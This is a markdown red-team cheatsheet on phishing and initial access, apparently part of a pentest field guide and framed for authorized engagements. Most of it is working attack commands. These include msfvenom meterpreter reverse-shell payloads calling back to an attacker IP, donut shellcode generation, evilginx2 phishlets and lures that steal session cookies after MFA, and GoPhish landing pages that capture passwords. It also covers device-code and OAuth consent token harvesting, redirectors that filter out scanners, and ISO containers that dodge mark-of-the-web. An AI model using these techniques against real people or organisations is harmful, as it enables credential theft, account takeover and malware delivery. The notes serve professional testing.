---
tags:
  - hack-notes
  - phishing
---

# Phishing and Initial Access Cheatsheet

Operator notes for authorized red team engagements. Everything here assumes a signed rules-of-engagement document and an in-scope target. The framing is defense-neutral: the point of running these is to measure and improve a client's resilience, then hand them the findings.

## Table of Contents

- [Infrastructure Prep](#infrastructure-prep)
- [Email Authentication Records](#email-authentication-records)
- [GoPhish](#gophish)
- [evilginx2](#evilginx2)
- [Microsoft 365 and Entra Attacks](#microsoft-365-and-entra-attacks)
- [Payload Types](#payload-types)
- [Payload Generation](#payload-generation)
- [Pretext and Delivery](#pretext-and-delivery)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Infrastructure Prep

Good infrastructure is the difference between landing in the inbox and dying in a spam folder. Build it before you write a single email.

### Domain Selection and Aging

```bash
# Pick a plausible domain: lookalike of the target, a vendor, or a generic theme
# (hr-portal, it-helpdesk, vendor-billing). Avoid obvious typosquats that scanners flag.

# Check a candidate domain's history before buying (was it ever malicious?)
whois candidate-domain.com

# Aged domains (registered weeks/months before use) clear reputation filters better.
# Register early, park it, and let it sit before the campaign.
```

### Categorization

```bash
# Mail gateways block "uncategorized" domains. Submit your domain for a benign
# category (Business, IT) with the major filters:
# - Bluecoat / Symantec site review
# - Palo Alto URL category test/change request
# - Cisco Talos reputation lookup
# Host a benign holding page during categorization so crawlers see clean content.
```

### Redirector

```bash
# Put a redirector in front of the real C2/phishing host so the backend stays hidden
# and you can filter scanners. Apache mod_rewrite example (only forward real victims):

# RewriteEngine On
# RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|bot|crawler) [NC]
# RewriteRule ^.*$ https://www.example.com/ [L,R=302]
# RewriteCond %{REQUEST_URI} ^/lure/
# RewriteRule ^lure/(.*)$ http://127.0.0.1:8080/$1 [P]

# Redirectors are commonly built with Apache, nginx, or a CDN/serverless function.
```

### TLS

```bash
# Always serve phishing/redirector over HTTPS; users and gateways distrust plain HTTP.
# Free, automated cert with Let's Encrypt:
certbot certonly --standalone -d lure.candidate-domain.com

# Or for a tool that manages its own certs (evilginx), point it at the domain and it
# will request certs automatically (see evilginx section).
```

---

## Email Authentication Records

You set SPF/DKIM/DMARC on your sending domain so your mail authenticates and lands. You check the target's records to see whether their primary domain can be spoofed directly.

### Records to Set on Your Sending Domain

```bash
# SPF: authorize your sending host's IP (publish as a TXT on the sending domain)
# v=spf1 ip4:203.0.113.10 -all

# DKIM: publish the public key your mailer signs with (selector._domainkey)
# selector._domainkey  TXT  "v=DKIM1; k=rsa; p=<base64 public key>"

# DMARC: a permissive policy so receivers accept aligned mail
# _dmarc  TXT  "v=DMARC1; p=none; rua=mailto:rua@candidate-domain.com"
```

### Checking a Target's Records With dig

```bash
# SPF record (look at the qualifier: -all = strict, ~all = soft, ?all = neutral)
dig +short TXT example.com | grep spf1

# DMARC policy (p=none means failures are not enforced; easier to spoof)
dig +short TXT _dmarc.example.com

# DKIM (you need the selector; common ones: default, selector1, selector2, google)
dig +short TXT selector1._domainkey.example.com

# MX records to know who handles their mail (O365, Google, Proofpoint, Mimecast)
dig +short MX example.com
```

### Spoofability Assessment

```bash
# A domain is directly spoofable when SPF is missing/soft AND DMARC is absent or p=none.
# Quick reads:
# - SPF "-all" + DMARC "p=reject"   -> hard to spoof the exact domain; use a lookalike
# - SPF "~all" or "?all", DMARC none -> spoofing the real domain may pass
# - No SPF at all                    -> wide open

# Automated checks:
spoofcheck.py example.com         # classic spoofability checker
swaks --to test@yourdomain.com --from spoofed@example.com --server your-relay
```

---

## GoPhish

GoPhish is an open-source framework for running and tracking phishing campaigns: it manages sending profiles, templates, landing pages, and per-recipient click/submit tracking.

### Setup

```bash
# Run the binary; admin UI on :3333, phishing server on :80/:8080
./gophish

# The admin login is printed to the console on first start.
# config.json controls listen addresses and TLS:
# "admin_server": { "listen_url": "127.0.0.1:3333", "use_tls": true }
# "phish_server": { "listen_url": "0.0.0.0:443", "use_tls": true }
```

### Sending Profile

```bash
# In the UI: Sending Profiles -> New
# - SMTP From:  IT Helpdesk <helpdesk@candidate-domain.com>
# - Host:       smtp.candidate-domain.com:587
# - Username/Password for your relay
# Use "Send Test Email" to confirm auth and inbox placement before the real run.
```

### Landing Page

```bash
# Landing Pages -> New. Either author HTML or use "Import Site" to clone a real
# login page. Enable:
# - "Capture Submitted Data"      ; record what they type
# - "Capture Passwords"           ; store the password field (handle per RoE)
# - "Redirect to" the real site after submit so the victim sees a normal login
```

### Email Template and Tracking

```bash
# Email Templates -> New. Use template variables for personalization and tracking:
# {{.FirstName}} {{.LastName}} {{.Email}}
# {{.URL}}            ; the per-recipient tracked phishing link
# {{.TrackingURL}}    ; explicit tracking pixel target
# {{.Tracker}}        ; inserts the 1x1 open-tracking pixel

# Campaigns -> New ties together: Template + Landing Page + Sending Profile + Group.
# Results show Sent / Opened / Clicked / Submitted Data per recipient in real time.
```

---

## evilginx2

evilginx2 is a man-in-the-middle reverse proxy that sits between the victim and the real site. Because the victim authenticates against the genuine site through your proxy, it captures the session cookie/token after MFA, defeating most second factors.

### Setup

```bash
# Point your phishing domain's A record at the evilginx host, and set the
# nameservers so evilginx can answer ACME/DNS. Then run:
sudo ./evilginx -p ./phishlets

# Inside the evilginx console, set the base domain and external IP:
# config domain candidate-domain.com
# config ipv4 203.0.113.10
```

### Phishlets

```bash
# Phishlets are YAML configs that define the proxy for a specific site (o365,
# google, okta, etc.). List and enable one:
# phishlets                          ; show available
# phishlets hostname o365 login.candidate-domain.com
# phishlets enable o365              ; requests TLS certs and goes live
# phishlets get-hosts o365           ; print DNS entries you must publish
```

### Lures

```bash
# A lure is the actual link you send to the victim. Create and configure:
# lures create o365
# lures edit 0 redirect_url https://www.office.com/   ; where to send them after capture
# lures edit 0 redirector download_page               ; optional templated landing
# lures get-url 0                                      ; print the link to send

# Watch captured sessions:
# sessions                          ; list captured sessions
# sessions 1                        ; show tokens/cookies for one session
```

### Using the Captured Tokens

```bash
# evilginx stores the full cookie jar (including the auth/session cookie minted
# AFTER MFA). Import those cookies into a browser (e.g. the "Cookie-Editor"
# extension) to ride the authenticated session without a password or second factor.
# This is the MFA-bypass primitive: you are reusing a valid post-auth session.
```

---

## Microsoft 365 and Entra Attacks

Cloud identity offers phishing paths that need no malicious attachment: device-code flow abuse and illicit OAuth consent grants both yield tokens.

### Device-Code Phishing

```bash
# The OAuth device-code flow lets a user authorize your request by entering a short
# code at a legitimate Microsoft URL. You start the flow, send the victim the code,
# and collect tokens once they approve.

# TokenTactics (PowerShell) automates the device-code grant:
# Import-Module .\TokenTactics.psd1
# Get-AzureToken -Client MSGraph
#   -> prints a user_code and the URL https://microsoft.com/devicelogin
# Send the victim: "Go to microsoft.com/devicelogin and enter ABCD-EFGH"
# After they approve, TokenTactics returns access + refresh tokens.

# Refresh the token to other resources (Graph, Outlook, Azure Core):
# Invoke-RefreshToOutlookToken -domain example.com -refreshToken $response.refresh_token
```

### Illicit Consent Grant

```bash
# Register a malicious multi-tenant app and request OAuth scopes (Mail.Read,
# Files.Read.All, offline_access). The victim sees a real Microsoft consent screen;
# if they click Accept, your app gets a refresh token for those scopes.

# o365-attack-toolkit stands up the consent-grant phishing app and token harvester:
# - configure the app client_id/secret and redirect_uri in its config
# - run the server; send the victim the generated consent URL
# - harvested tokens land in the toolkit's database for mailbox/file access

# 365-Stealer and similar tools implement the same consent-grant pattern.
```

---

## Payload Types

When the objective is code execution rather than credential capture, the lure delivers a payload. Containers (ISO/IMG/VHD) are favored because they bypass mark-of-the-web tagging on the files inside.

```bash
# Maldoc macro: Office doc with a VBA AutoOpen/Document_Open macro. Increasingly
# blocked (macros from the internet are disabled by default), but still relevant for
# trusted-location or internal-doc pretexts.

# HTA: HTML Application run by mshta.exe; embeds VBScript/JScript that executes.
#   mshta.exe payload.hta

# LNK: a shortcut whose target is a living-off-the-land binary with arguments
#   (powershell, mshta, rundll32). Popular as the trigger inside a container.

# ISO / IMG / VHD container smuggling: mountable disk images. Files placed inside do
#   NOT inherit mark-of-the-web, so SmartScreen/macro blocks on the inner LNK/HTA do
#   not fire. The victim double-clicks the image, then the inner shortcut.

# OneNote (.one): embeds attachments/scripts a user clicks to "open"; bypassed many
#   macro controls until Microsoft added protections.

# CHM: compiled HTML Help file that can run script via an embedded shortcut object.
```

---

## Payload Generation

### msfvenom

```bash
# Windows reverse shell (staged meterpreter) as a raw exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.10 LPORT=443 \
  -f exe -o payload.exe

# Shellcode as raw bytes for embedding/loading
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=203.0.113.10 LPORT=443 \
  -f raw -o shellcode.bin

# DLL output (for rundll32 / sideloading pretexts)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.10 LPORT=443 \
  -f dll -o payload.dll

# HTA output for an mshta-driven lure
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.10 LPORT=443 \
  -f hta-psh -o payload.hta
```

### donut

```bash
# Convert an exe/dll/.NET assembly into position-independent shellcode for in-memory
# execution (avoids dropping the original file to disk)
donut -i payload.exe -o shellcode.bin

# Target architecture and a specific .NET method/class
donut -i Loader.exe -a 2 -c Namespace.Class -m Method -o shellcode.bin

# Output as a base64/C array for embedding into a loader
donut -i payload.exe -f 2 -o shellcode.b64
```

---

## Pretext and Delivery

```bash
# A pretext is the story that makes the click reasonable. Keep it specific, timely,
# and aligned to the recipient's role. Stronger pretexts:
# - IT: "MFA re-enrollment required by Friday" (drives device-code / evilginx)
# - HR: "Updated benefits / payroll portal" (credential capture)
# - Vendor/Finance: "Invoice #4471 overdue" (container payload)
# - Internal tool: cloned login for a real app the org uses

# Delivery hygiene:
# - Send a test to a controlled mailbox first; check inbox vs spam placement.
# - Warm the domain: send low volume of benign mail before the campaign.
# - Match the From display name to the pretext sender; align the reply-to.
# - Throttle sends so you do not trip rate-based gateway rules.
# - Host the lure behind a redirector that filters sandbox/scanner user-agents.

# Pre-send checks:
swaks --to victim@example.com --from helpdesk@candidate-domain.com \
  --server smtp.candidate-domain.com:587 --auth --header "Subject: test"
```

---

## Common Workflows

### Workflow: Prep Domain and Records to Lure to evilginx MFA Bypass to Access

```bash
# 1. Register an aged/lookalike domain and submit for benign categorization
whois candidate-domain.com

# 2. Set authentication records on the sending domain (SPF/DKIM/DMARC) and confirm
dig +short TXT candidate-domain.com | grep spf1
dig +short TXT _dmarc.candidate-domain.com

# 3. Assess the target's spoofability to decide spoof vs lookalike
dig +short TXT example.com | grep spf1
dig +short TXT _dmarc.example.com

# 4. Stand up evilginx, point DNS, enable the phishlet, get certs
sudo ./evilginx -p ./phishlets
# config domain candidate-domain.com / config ipv4 203.0.113.10
# phishlets hostname o365 login.candidate-domain.com
# phishlets enable o365

# 5. Build the lure and grab the link
# lures create o365
# lures edit 0 redirect_url https://www.office.com/
# lures get-url 0

# 6. Send the IT re-enrollment pretext via GoPhish (or directly) and track
# 7. Victim authenticates through the proxy (including MFA); capture the session
# sessions / sessions 1

# 8. Import the captured post-MFA cookies into a browser -> authenticated access
```

### Workflow: Credential Capture With GoPhish

```bash
# 1. Clone the target login page as a GoPhish landing page (Import Site)
# 2. Enable Capture Submitted Data + Capture Passwords, set Redirect to real site
# 3. Build the email template with {{.URL}} and {{.Tracker}}
# 4. Configure the sending profile + group, launch the campaign
# 5. Watch Submitted Data per recipient in the Results dashboard
```

### Workflow: Container Payload Initial Access

```bash
# 1. Generate shellcode and wrap it in a loader (or build an LNK trigger)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=203.0.113.10 LPORT=443 -f raw -o sc.bin
donut -i loader.exe -o sc.bin

# 2. Place the inner LNK/HTA inside an ISO so it dodges mark-of-the-web
# 3. Deliver the ISO behind a redirector with an invoice/HR pretext
# 4. Catch the callback on your listener (e.g. msfconsole multi/handler on 443)
```

---

## Quick Reference

```bash
# Domain / infra
whois candidate-domain.com                       # vet domain history
certbot certonly --standalone -d lure.dom.com    # TLS cert

# Email auth checks (target)
dig +short TXT example.com | grep spf1           # SPF qualifier
dig +short TXT _dmarc.example.com                # DMARC policy
dig +short TXT selector1._domainkey.example.com  # DKIM
dig +short MX example.com                        # mail provider
swaks --to t@x --from spoof@example.com --server relay  # spoof test

# GoPhish
./gophish                                        # admin :3333 / phish :443
# Template vars: {{.FirstName}} {{.URL}} {{.Tracker}}

# evilginx2
sudo ./evilginx -p ./phishlets                   # start proxy
# phishlets enable o365 / lures create o365 / lures get-url 0 / sessions

# M365 / Entra
# Get-AzureToken -Client MSGraph                  # TokenTactics device-code
# o365-attack-toolkit                             # illicit consent grant

# Payloads
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x LPORT=443 -f exe -o p.exe
donut -i p.exe -o sc.bin                          # exe -> PIC shellcode

# Delivery
swaks --to victim@example.com --from helpdesk@dom.com --server smtp:587 --auth
```

---

## Related

- Checklists: [Phishing and Social Engineering](../Checklists/Phishing%20and%20Social%20Engineering.md)
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [Azure and Entra ID](Azure%20and%20Entra%20ID.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
